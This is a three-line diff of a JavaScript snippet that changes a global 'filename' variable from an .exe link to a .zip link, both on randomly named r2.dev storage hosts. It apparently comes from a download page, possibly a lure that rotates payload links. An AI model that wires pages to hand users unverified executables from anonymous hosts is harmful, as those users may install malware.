@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] ='https://pub-b978efee5f74796b091da96ca739efb.r2.dev/wp_H3.14_X64.exe';
+    window['filename'] ='https://pub-dd6afa06e64b4cbea0fbd12138cd4033.r2.dev/Dngme-longzhigu.zip';
 })();
